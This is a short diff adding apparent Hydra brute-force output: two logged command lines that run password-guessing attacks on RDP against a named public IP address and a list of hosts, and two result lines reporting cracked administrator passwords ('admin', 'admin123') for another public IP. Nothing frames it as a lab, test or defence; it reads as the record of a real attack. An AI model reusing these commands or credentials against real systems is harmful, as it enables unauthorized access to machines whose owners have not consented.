@@ -1,0 +1,4 @@
+# Hydra v9.2 run at 2026-07-28 06:27:21 on 103.24.230.93 rdp (hydra -L /tmp/u.txt -P /tmp/pass.txt -t 2 -w 5 -o /tmp/rdp_result.txt rdp://103.24.230.93)
+# Hydra v9.2 run at 2026-08-04 07:21:35 on /tmp/rdp15.txt rdp (hydra -l administrator -P /tmp/pass.txt -M /tmp/rdp15.txt -t 2 -o /tmp/rdp_result.txt rdp)
+[3389][rdp] host: 106.12.158.254   login: administrator   password: admin
+[3389][rdp] host: 106.12.158.254   login: administrator   password: admin123
